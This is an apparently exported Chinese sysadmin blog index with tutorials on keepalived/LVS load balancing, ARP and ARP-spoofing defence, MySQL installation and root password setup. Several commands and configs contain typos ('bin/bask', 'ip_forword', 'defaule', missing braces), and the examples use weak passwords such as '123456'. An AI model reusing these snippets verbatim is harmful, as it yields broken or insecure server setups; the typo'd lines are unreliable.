&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就实现了阿里云环境下的HA切换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实际测试，阿里云的多个HAVIP可以绑定到同样的两台机器，可以配置多组 vrrp_instance来实现双主。或者两台服务器同时为两个业务服务，避免资源浪费。同时能够做到主备]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[keepalived 和 lvs 的结合配置文件详解]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F7.%20keepalived%20%E5%92%8C%20lvs%20%E7%9A%84%E7%BB%93%E5%90%88%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[keepalived 和 lvs 的结合配置文件详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/export/servers/keepalived/conf/keepalived.conf配置文件详解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970! Configuration File for keepalived#全局配置global_defs &#123;notification_email &#123; #设置报警邮件地址，每行一个，（如何要开启邮件报警，需要开启本机的sendmail服务）lihuiyw@jd.com&#125;notification_email_from lihuiyw@jd.com #设置邮件的发送地址smtp_server mail.jd.com #设置邮件的smtp server地址smtp_connect_timeout 30 #设置连接smtp server的超时时间router_id LVS_DEVEL #表示keepalived服务器的一个标识，是发邮件时显示在邮件主题中的信息&#125;#keepalived的VRRPD配置，是所有keepalived配置的核心#VRRP实例配置vrrp_instance VIP_142 #是VRRP实例开始的标识，后跟VRRP实例名称&#123;state MASTER #keepalived的角色，MASTER主，BACKUP备interface eth0 #用于指定HA监测网络的接口virtual_router_id 142 #虚拟路由标识，这个标识是一个数字，同一个VRRP实例使用唯一的一个标识，即在同一个vrrp_instance下，MASTER和BACKUP必须是一致的！priority 100 #权重优先级advert_int 2 #用于设定master和backup主机之间同步检查的时间间隔，单位是秒garp_master_delay 10 #用于切换到master状态后延时进行Gratuitous arp请求的时间smtp_alert #表示是否开启邮件通知(用全局区域的邮件设置来发通知)authentication #主备之间进行通信的验证类型和密码：验证类型主要有PASS和AH两种，一个在vrrp_instance下，MASTER和backup必须使用相同的密码才可以通信&#123;auth_type PASSauth_pass 123456&#125;#virtual_ipaddress用于设置虚拟ip地址，可以设置多个vip，每行一个，virtual_ipaddress&#123;10.95.0.200/24&#125;track_interface #用于设置一些额外的网络监控接口，其中任何一个网络接口出现故障，keepalived都会进去fault状态！&#123;eth0&#125;nopreempt #设置不抢占功能，只能在backup上使用，知道机器有故障了才切换，preemtp_delay 300 #用于设置抢占的延时时间，（例：开启启动没必要抢占）&#125;#以下是lvs的主要主要配置信息，主要实现lvs的ip包转发功能！virtual_server 10.95.0.200 80 #虚拟ip和端口&#123;delay_loop 6 #设置健康检查的时间间隔lb_algo wrr #设置负载调度算法lb_kind DR #设置lvs的模式persistence_timeout 60 #会话保持时间，单位秒protocol TCP #ip包转发协议，有TCP和UDP两种real_server 10.95.0.143 80 #real server 的ip&#123;weight 3 #权重TCP_CHECK #健康检查&#123;connect_timeout 10 #表示无响应超时时间nb_get_retry 3 #表示重连次数delay_before_retry 3 #表示重试间隔connect_port 80 #表示端口&#125;&#125;real_server 10.95.0.144 80&#123;weight 3TCP_CHECK&#123;connect_timeout 10nb_get_retry 3delay_before_retry 3connect_port 80&#125;&#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;健康监测应许多种检查方式，常见的有，HTTP_GET，SSL_GET，TCP_CHECK，SMTP_CHECK，MISC_CHECK. 123456TCP_CHECK &#123;conetct_port 80connect_timeout 3nb_get_retry 3delay_before_retry 3&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;connect_port:健康检查的端口，如果不指定，默认是real_server指定的端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;connect_timeout:表示无响应超时时间，单位是秒，这里是3s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nb_get_retry：表示重试次数，这里是3ci &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;delay_before_retry：表示重试间隔， 123456789101112131415HTTP_GET |SSL_GET&#123;url&#123;path /index.html #指定url信息digest e6owjfdsjfalsjdfsalkf30wfdsfjwqe#ssl检查后的摘要信息，这些摘要信息可以通过genhash命令工具获取，#例：genhash -s 192.168.12.80 -p 80 -u /index.htmlstatus_code 200&#125;connect_port 80bindto 192.168.31.128 #表示通过此地址来对发送请求对服务器进行健康检查nb_get_retry 3delay_before_retry 2&#125;]]></content>
      <tags>
        <tag>LVS</tag>
        <tag>keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS原理详解及部署之一：ARP原理准备]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F8.%20LVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E5%8F%8A%E9%83%A8%E7%BD%B2%E4%B9%8B%E4%B8%80%EF%BC%9AARP%E5%8E%9F%E7%90%86%E5%87%86%E5%A4%87%2F</url>
    <content type="text"><![CDATA[LVS原理详解及部署之一：ARP原理准备一、ARP技术概念介绍&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么讲ARP技术，因为平常工作中有接触。还有就是LVS的dr模式是用到arp的技术和数据。 1、什么是ARP协议&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ARP协议全程地址解析协议（AddressResolution Protocol，ARP）是在仅知道主机的IP地址时确定其物理地址的一种协议。因IPv4和以太网的广泛应用，其主要作用是通过已知IP地址，获取对应物理地址的一种协议。 2、什么是ARP代理（ARP proxy）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在网络中代理是非常常见的，所谓的代理就是我朝一个人要，另外一个人给。生活中一个比较实际的例子就是，房屋中介。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Arp协议要求通信的主机的双方必须是在物理的同一个网段。那如果发送主机和目标主机不是在同一个局域网里，而ARP广播包是不能够跨越网段进行传输的。所以此时就需要一个路由或ARP中继技术来转发ARP请求包。客户端获取到的MAC地址是路由器或者中继的MAC地址。那么之后这个客户端发给目的端的数据，都会先发给这个路由器或ARP中继，再进而转给目的端，这种情况就称为ARP代理。 3、arp协议工作原理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原理图： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当主机10.0.0.1要发送数据给10.0.0.2数据，会首先去查本地的arp缓存表，如果有此IP地址和此主机对应的MAC地址，如果有就可以直接传输数据。如果没有就主机10.0.0.1就会向局域网去广播，询问谁的IP地址是10.0.0.2.此时在本局域网中的所有主机都能够收到此广播包，但只有主机10.0.0.2才会回应这个广播包。会以单播的形式直接回复10.0.0.2说我的MAC地址为多少。此时10.0.0.1收到了此信息，那么两者之间就能够通过MAC地址进行通信了。并且将这个ARP和IP对应信息缓存到ARP缓存表里。 ARP欺骗工作原理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ARP欺骗就是通过伪造IP地址和MAC地址对实现ARP欺骗的，它能够在网络中产生大量的ARP包，来让网络堵塞。攻击主机只要持续的发送假的ARP包，让网络中的主机缓存错误的IP-MAC对应信心，造成网络中断或中间人攻击。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ARP攻击主要是在局域网中的，因为ARP包是不会垮网络传播的。所以划分VLAN能够减少当受到ARP攻击后，网络受影响的范围。 ARP欺骗过程图及讲解： ARP欺骗防御办法 进行MAC和IP地址进行绑定 杀毒软件开启arp防火墙 ARP病毒排查 使用arp –a命令查看本地arp缓存表，查看重复MAC地址或在交换机路由器上查看重复MAC地址。 使用ARP防御软件或检测软件（如：科莱，彩影arp防火墙分析流量，查找可以攻击源） 使用折半法排除网络出错范围。（如先断开一般的网络查看是否正常，如果正常就说明断开的那部分有问题。然后再接上剩下的那一半继续查看，依次类推最终找到问题点）当然排查、预防ARP攻击的方法有很多，大家可以自己寻找。 小结&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ARP协议的功能就是能够通过IP地址解析到MAC地址。而ARP欺骗的手段就是通过伪造IP-MAC信息，让网络上的主机受骗。误以为攻击主机就是他们要发送的目标主机（路由器）这样就将信息都发给了攻击者，攻击者就能获取网络其他主机的数据包。而且网络上的主机会出现网络中断等现象。如果攻击者在网络上大量的发送ARP信息，也会造成网络的堵塞。]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LVS原理详解及部署之五：LVS+keepalived实现负载均衡&高可用]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F12.%20LVS%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3%E5%8F%8A%E9%83%A8%E7%BD%B2%E4%B9%8B%E4%BA%94%EF%BC%9ALVS%2Bkeepalived%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%26%E9%AB%98%E5%8F%AF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[LVS原理详解及部署之五：LVS+keepalived实现负载均衡&amp;高可用一、实验环境需求&amp;准备&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这次实验要完成的一个架构如下图所示，通过LVS-DR-MASTER,LVS-DR-BACKUP作为LVS负载均衡调度器，并且两者之间通过keepalived来两者之间的HA。keepalived本身就是为了LVS为开发的，所以说通过keepalived来进行LVS的配置就显得十分的方便。而且keepalived是直接操作ip_vs不用通过ipvsadm，所以更加方便。 实验架构图&amp;需求表： 角色 IP地址 备注 主LVS调度器（MASTER) 192.168.41.181 使用keepalived配置备 LVS调度器（BACKUP) 192.168.41.25 &#160; 1HTTP服务器（RS1) 192.168.41.31 apache服务器（一般生产环境需要外网IP地址，这里用内网IP地址替代） HTTP服务器（RS2) 192.168.41.33 &#160; 虚拟IP地址（VIP) 192.168.41.249 虚拟IP地址 部署http服务器，验证能正常访问 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里就是要保证http能正常访问。 二、配置keepalived实现负载均衡&amp;高可用安装keepalived软件123456wget http://www.keepalived.org/software/keepalived-1.2.8.tar.gztar -zxf keepalived-1.2.8.tar.gzcd keepalived-1.2.8./configure --prefix=/usr/local/keepalivedmakemake install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置keepalived的自启动&amp;拷贝keepalived的执行程序 1234cp /usr/local/keepalived/sbin/keepalived /usr/sbin/cp /usr/local/keepalived/sbin/keepalived /usr/sbin/cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/init.d/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开启内核的转发功能 1vi /etc/sysctl net.ipv4.ip_forword = 1 配置LVS-DR-MASK的keepalived.conf配置文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; 752119102@qq.com #设置报警邮箱，一般不再这做，而是用其他方式报警。 &#125; notification_email_from keepalived@localhost #设定发送邮件地址 smtp_server 127.0.0.1 #设定发送邮件服务器 smtp_connect_timeout 30 #设定SMTP连接超时时间 router_id LVS_DEVEL #查阅说明文档得知route_id配置是为了标识当前节点，我将其设置为NodeA。当然两个节点的此项设置可相同，也可不相同。&#125;vrrp_instance VI_1 &#123; #定义虚拟路由实例，不同实例ID不同。 state MASTER #定义服务器在keepalived中的角色主服务器 interface eth0 #定义进行检测的端口eth0 virtual_router_id 51 #定义虚拟路由ID，同一个实例的主从一样。 priority 100 #定义在虚拟路由器组的权限，越大越高 advert_int 1 #定义检测时间间隔 authentication &#123; #定义认证方式密码，主从必须一样 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #指定虚拟IP地址 192.168.41.249 &#125;&#125;virtual_server 192.168.41.249 80 &#123; #定义虚拟服务，需指定IP地址和端口，空格隔开。 delay_loop 6 #定义RS运行情况监测时间间隔 lb_algo rr #定义负载调度算法 lb_kind DR #定义LVS的工作模式 nat_mask 255.255.255.0 #定义虚拟服务的mask persistence_timeout 50 #定义会话保持时间，S为单位 protocol TCP #指定转发协议 real_server 192.168.41.31 80 &#123; #定义真实服务器IP地址和端口 weight 1 #定义RS的权重 TCP_CHECK&#123; #RS server健康检查部分 connect_timeout 10 #定义超出10s连接超时 nb_get_retry 3 #定义重试次数 delay_before_retry 3 #定义重试时间间隔 connect_port 80 #定义健康检查端口 &#125; real_server 192.168.41.33 80 &#123; weight 1 TCP_CHECK&#123; connect_timeout 10 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125;&#125; 配置LVS-DR-BACKUP的keepalived.conf配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647! Configuration File for keepalivedglobal_defs &#123; notification_email &#123; 752119102@qq.com #设置报警邮箱，一般不再这做，而是用其他方式报警。 &#125; notification_email_from keepalived@localhost #设定发送邮件地址 smtp_server 127.0.0.1 #设定发送邮件服务器 smtp_connect_timeout 30 #设定SMTP连接超时时间 router_id LVS_DEVEL #负载均衡器标示，在局域网内是唯一的&#125;vrrp_instance VI_1 &#123; #定义虚拟路由实例，不同实例ID不同。 state BACKUP #定义服务器在keepalived中的角色 interface eth0 #定义进行检测的端口eth0 virtual_router_id 51 #定义虚拟路由ID，同一个实例的主从一样。 priority 50 #定义在虚拟路由器组的权限，越大越高 advert_int 1 #定义检测时间间隔 authentication &#123; #定义认证方式密码，主从必须一样 auth_type PASS auth_pass 1111 &#125; virtual_ipaddress &#123; #指定虚拟IP地址 192.168.41.249 &#125;&#125;virtual_server 192.168.41.249 80 &#123; #定义虚拟服务，需指定IP地址和端口，空格隔开。 delay_loop 6 #定义RS运行情况监测时间间隔 lb_algo rr #定义负载调度算法 lb_kind DR #定义LVS的工作模式 nat_mask 255.255.255.0 #定义虚拟服务的mask persistence_timeout 50 #定义会话保持时间，S为单位 protocol TCP #指定转发协议 real_server 192.168.41.31 80 &#123; #定义真实服务器IP地址和端口 weight 1 #定义RS的权重 TCP_CHECK&#123; #RS server健康检查部分 connect_timeout 10 #定义超出10s连接超时 nb_get_retry 3 #定义重试次数 delay_before_retry 3 #定义重试时间间隔 connect_port 80 #定义健康检查端口 &#125; real_server 192.168.41.33 80 &#123; weight 1 TCP_CHECK&#123; connect_timeout 10 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：这里主LVS-DR-MASTER和LVS-DR-BACKUP之间的配置的差别就只有红色部分：HA的角色（MASTER,BACKUP)和优先级不同，还有router_id。 客户端配置LVS参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户端需要做的工作就是绑定我们的VIP在lo口，并且进行ARP抑制，之前的文章已经提过此方法咯。现在我们就换成将配置写成脚本来执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;脚本内容： 1234567891011121314151617181920212223242526272829303132333435363738394041[root@RS2 ~]# cat lvs-client.sh#!/bin/bask# 752119102@qq.com#. /etc/rc.d/init.d/functionsVIP=(192.168.41.249)function start()&#123; for ((i=0;i&lt;`echo $&#123;#VIP[*]&#125;`;i++)) do echo $&#123;i&#125; $&#123;VIP[$i]&#125; ifconfig lo:$&#123;i&#125; $&#123;VIP[$i]&#125; netmask 255.255.255.255 up route add -host $&#123;VIP[$i]&#125; dev lo doneecho "1"&gt;/proc/sys/net/ipv4/conf/lo/arp_ignoreecho "2"&gt;/proc/sys/net/ipv4/conf/lo/arp_announceecho "1"&gt;/proc/sys/net/ipv4/conf/all/arp_announceecho "2"&gt;/proc/sys/net/ipv4/conf/all/arp_announce&#125;function stop()&#123; for ((i=0;i&lt;$&#123;#VIP[*]&#125;;i++)) do echo $&#123;i&#125; $&#123;VIP[$i]&#125; ifconfig lo:$&#123;i&#125; $&#123;VIP[$i]&#125; netmask 255.255.255.255 up route del -host $&#123;VIP[$i]&#125; dev lo:$&#123;i&#125; done&#125;case "$1" in start) start exit ;; stop) stop exit ;; *) echo "You must use $0:stop|start" ;;esac 测试实验结果&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果测试部成功可以按照三角的排查原理来进行排查，显示client到RS端是否能通讯，LB到RS能否通讯，client到LB是否能通讯，client到VIP是否能够通讯。并且查看LVS的运行状态。一定要确保keepalived.conf这个配置文件是正确的。]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[只有一个公网IP也可以使用LVS的DR模式！(外带php session粘滞问题解决）]]></title>
    <url>%2F2017%2F08%2F10%2FLVS%2F18.%20%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%85%AC%E7%BD%91IP%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8LVS%E7%9A%84DR%E6%A8%A1%E5%BC%8F%EF%BC%81(%E5%A4%96%E5%B8%A6php%20session%E7%B2%98%E6%BB%9E%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%EF%BC%89%2F</url>
    <content type="text"><![CDATA[只有一个公网IP也可以使用LVS的DR模式！(外带php session粘滞问题解决） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;单个公网ip怎么才能使用LVS的DR模式？倒不是因为没有公网IP，而是由于安全性的考虑不希望服务器都暴漏在外，又不想因为这个小项目买防火墙，所以就提了这个要求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;怎么样才能实现呢？一个公网IP也可以做DR啊，前面加个路由器就可以了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体结构就想上面那个图那样 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;原理就是让 路由器把所有的80端口请求都分给VIP，分发器再分给每个web服务器，而web服务器处理完请求后跟客户连接就不走分发器了，直接通过路由器去外网了，这样就实现了只用一个公网IP也能用DR模式，呵呵 具体配置如下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先从内网找了三台服务器分别是： 192.168.1.166 web1 192.168.1.167 web2 192.168.1.160 分发器 192.168.1.169 VIP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;192.168.1.1 路由器内网ip(网关) 路由器是随便找的一台tplink adal路由器，凑合着测试用的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;211.83.113.119 路由器的WAN口IP &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;先安装ipvsadm 直接yum install ipvsadm就行了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用的是keepalived，配置文件贴上来，以下是分发器上的设置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758global_defs &#123; notification_email &#123; ufo@xman.com &#125;notification_email_from Alexandre.Cassen@firewall.loc smtp_server smtp.qq.com smtp_connect_timeout 30 router_id LVS_DEVEL&#125;vrrp_sync_group VG1 &#123; group&#123; VI_1 &#125; &#125;vrrp_instance VI_1 &#123; state MASTER interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication &#123; auth_type PASS auth_pass 33210 &#125; virtual_ipaddress &#123; 192.168.1.169 &#125; virtual_server 192.168.1.169 80 &#123; delay_loop 6 lb_algo rr lb_kind DR protocol TCP real_server 192.168.1.166 80 &#123; weight 1 inhibit_on_failure TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; real_server 192.168.1.167 80 &#123; weight 1 inhibit_on_failure TCP_CHECK &#123; connect_timeout 5 nb_get_retry 3 delay_before_retry 3 connect_port 80 &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件写完了，然后就是 12345mkdir /etc/keepalived #系统默认会到这里去找配置文件cp /usr/local/keepalive/etc/keepalived/keepalived.conf /etc/keepalived/cp /usr/local/keepalive/etc/rc.d/init.d/keepalived /etc/init.d/cp /usr/local/keepalive/etc/sysconfig/keepalived /etc/sysconfig/cp /usr/local/keepalive/sbin/keepalived /bin/ #将可执行程序放入sbin 或者 bin目录里 123vim /etc/sysctl.confnet.ipv4.ip_forward = 1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存退出 后执行 1sysctl -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;route add defaule gw 192.168.1.1 把路由内网地址添加为默认网关 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;web服务器设置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两台web服务器也要修改 /etc/sysctl.conf 修改内容如下 1234567vim /etc/sysctl.conf# LVSnet.ipv4.conf.all.arp_ignore = 1net.ipv4.conf.all.arp_announce = 2net.ipv4.conf.lo.arp_ignore = 1net.ipv4.conf.lo.arp_announce = 2sysctl -p &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;之后还要增加vip &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ifconfig lo:1 192.168.1.169 netmask 255.255.255.255 别忘了加到rc.local里面 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;route add defaule gw 192.168.1.1 把路由内网地址添加为默认网关 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;路由器设置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;路由器的设置没什么好说的，除了上网设置以外还要做一个端口映射，就是把80端口映射到 vip上也就是192.168.1.169 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在启动keepalived吧 1/etc/init.d/keepalived start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开始的时候比较慢，大概1分钟后系统日志里面出现下面这条记录就OK了 1avahi-daemon[3012]: Registering new address record for 192.168.1.169 on eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;访问一下 http://211.83.113.119 成功了 1234567ipvsadm -L -nIP Virtual Server version 1.2.1 (size=4096)Prot LocalAddress:Port Scheduler Flags -&gt; RemoteAddress:Port Forward Weight ActiveConn InActConnTCP 192.168.1.169:80 rr -&gt; 192.168.1.166:80 Route 1 5 6 -&gt; 192.168.1.167:80 Route 1 3 9 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后来遇到了一个问题，由于这套应用处在一个大网站的后台，所以大部分的请求都来自同一个IP地址，而有一部分程序需要给每个连接做session粘滞， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就不能用lvs 的-p参数来设置ip粘滞时间，如果用lvs的粘滞时间的话大部分的请求都将分给同一台web服务器(注意：这里是session粘滞而不是IP粘滞)， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lvs可做不到这点，怎么办呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法是 将session共享，共享到什么地方就有很多选择了 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里是把所有web服务器的php session都给memcached ，这样不管分发器把 ip连接分给哪个web服务器都不会有问题了，配置方法很简单，就在php的配置文件内 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一条语句就可以了，不过前提需要装好memcache模块 1234[Session]; Handler used to store/retrieve data.session.save_handler = memcachesession.save_path = "tcp://192.168.1.161:11213"]]></content>
      <tags>
        <tag>LVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL安装]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F1.%20Mysql%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[MySQL安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;平时安装mysql都是源码包安装的，但是由于它的编译需要很长的时间，所以建议使用二进制免编译包安装。可以到MySQL官方网站去下载，具体版本根据平台和需求而定，目前比较常用的为mysql-5.0/mysql-5.1，5.5和5.7版本虽然已经发布有段日子了，但是在线上跑服务器的还是少数。所以本文安装5.1的版本。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装以前一定要知道Linux系统是多少位。 12uname -ii386 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;i386其实就是32位，需要下载i686的包，如果结果为x86_64，则为64位。 1、下载mysql到/usr/local/src/12cd /usr/local/src/wget http://syslab.comsenz.com/downloads/linux/mysql-5.1.40-linux-i686-icc-glibc23.tar.gz 2、解压1[root@localhost src]# tar zxvf /usr/local/src/mysql-5.1.40-linux-i686-icc-glibc23.tar.gz 3、把解压完的数据移动到/usr/local/mysql1[root@localhost src]# mv mysql-5.1.40-linux-i686-icc-glibc23 /usr/local/mysql 4、建立mysql用户1[root@localhost src]# useradd -s /sbin/nologin mysql 5、初始化数据库123[root@localhost src]# cd /usr/local/mysql[root@localhost mysql]# mkdir -p /data/mysql ; chown -R mysql:mysql /data/mysql[root@localhost mysql]# ./scripts/mysql_install_db --user=mysql --datadir=/data/mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; --user 定义数据库的所属主， --datadir 定义数据库安装到哪里，建议放到大空间的分区上，这个目录需要自行创建。这一步很关键，如果看到两个“OK”，说明执行正确，否则请仔细查看错误信息。 遇到错误11./bin/mysqld: error while loading shared librarues:libstdc++.so.5:cannot open shared object file: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;解决办法 1yum install -y compat-libstdc++-33 遇到错误21./scripts/mysql_install_db: ./bin/my_print_defaults: /lib/ld-linux.so.2:bad ELF interpreter: NO such file or directory &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为，系统版本和mysql版本不一致。比如Linux系统是32位，mysql安装包是64位。所以解决办法是重新虾子合适的安装包。 依赖包的安装1yum -y install make gcc-c++ cmake bison-devel ncurses-devel libaio libaio-devel perl-Data-Dumper net-tools 6、拷贝配置文件1[root@localhost mysql]# cp support-files/my-large.cnf /etc/my.cnf 7、拷贝启动脚本文件并修改其属性12[root@localhost mysql]# cp support-files/mysql.server /etc/init.d/mysqld[root@localhost mysql]# chmod 755 /etc/init.d/mysqld 8、修改启动脚本1[root@localhost mysql]# vim /etc/init.d/mysqld &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要修改的地方有 datadir=/data/mysql （之前初始化数据库时定义的目录） 9、把启动脚本加入系统服务项，设定开机启动并启动mysql123[root@localhost mysql]# chkconfig --add mysqld[root@localhost mysql]# chkconfig mysqld on[root@localhost mysql]# service mysqld start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果启动不了，请到 /data/mysql/ 下查看错误日志，这个日志通常是 主机名.err。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;检查mysql是否启动： 1[root@localhost mysql]# ps aux |grep mysqld]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql5.7root密码更改]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F10.%20mysql5.7%20root%E5%AF%86%E7%A0%81%E6%9B%B4%E6%94%B9%2F</url>
    <content type="text"><![CDATA[mysql5.7 root密码更改&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql5.7root有默认密码，必须重设密码后，才能进行mysql的操作，以下是设置root密码的步骤 一、查看默认密码12[root@localhost src]# cat /root/.mysql_secret# The random password set for the root userat Fri Jan 10 20:00:34 2014 (local time): aJqZsA2m &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里的aJqZsA2m就是生成的root随机密码。 二、登录mysql12[root@localhost src]# mysql -u root -pEnter password: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输入上面的密码aJqZsA2m登录，如果没有把mysql的路径加到PATH里，那就用绝对路径。mysql -u root -p 还可以写成 mysql -uroot -paJqZsA2m。 三、更改密码12mysql&gt; SET PASSWORD FOR 'root'@localhost = PASSWORD（'123456'）；Query OK, 0 rows affected (0.17 sec) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至此，就成功的修改了密码。]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql登录]]></title>
    <url>%2F2017%2F08%2F10%2FMySQL%2F11.%20%20mysql%E7%99%BB%E5%BD%95%2F</url>
    <content type="text"><![CDATA[mysql登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;mysql服务启动时，不仅会监听 IP:Port，还会监听一个socket。我们安装的mysql是监听在/tmp/mysql.sock。如果php是在本地，那么php和mysql通信可以通过socket通信，如果是远程，就需要通过tcp/ip来通信了。在Linux命令行下，可以通过如下方法来连接mysql服务器。 tcp/ip的方式1[root@lamp ~]# /usr/local/mysql/bin/mysql -uroot -h 127.0.0.1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就连接上了，如果默认mysql的root用户密码为空，就不用加-p选项，不过最好还是设置一个密码。 1[root@lamp ~]# /usr/local/mysql/bin/mysqladmin -uroot password 'yanyi' `&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只是第一次设置密码的时候可以这样，再次设置时，就需要先输入之前的root密码了。 1[root@lamp ~]# /usr/local/mysql/bin/mysqladmin -uroot -pyanyi password '123456' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有个问题，每次敲命令都是用的绝对路径，这样很繁琐，两个办法可以解决。第一个办法是设置alias，第二个办法是设置PATH 12[root@lamp ~]# alias mysql=/usr/local/mysql/bin/mysql[root@lamp ~]# alias mysqladmin=/usr/local/mysql/bin/mysqladmin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果要永久生效，需要把两个alias放到 .bashrc 里面。 1[root@lamp ~]# vim .bashrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;另外就是设置PATH 1[root@lamp ~]# vim /etc/profile.d/path.sh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入 1export PATH=$PATH:/usr/local/mysql/bin &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后执行 1[root@lamp ~]# source /etc/profile.d/path.sh 